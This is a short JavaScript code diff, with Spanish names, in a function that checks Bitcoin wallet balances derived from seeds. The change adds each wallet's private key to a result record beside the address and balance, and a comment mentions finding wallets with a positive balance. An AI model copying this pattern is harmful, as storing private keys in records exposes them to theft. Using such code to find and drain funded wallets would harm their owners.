@@ -16,6 +16,7 @@ const ValidarSaldoWallet = async (wallet, semillas, walletBTC) => {
             wallet_de: "BTC",
             direccion: walletBTC.Direccion,
             saldo: `confi: ${wallet.confirmed}, unconf: ${wallet.unconfirmed}`,
+            clavePrivada: walletBTC.Clave_privada,
             fecha: new Date().toISOString(),
         };
         //encontrar wallet con balance positivo o por confirmar
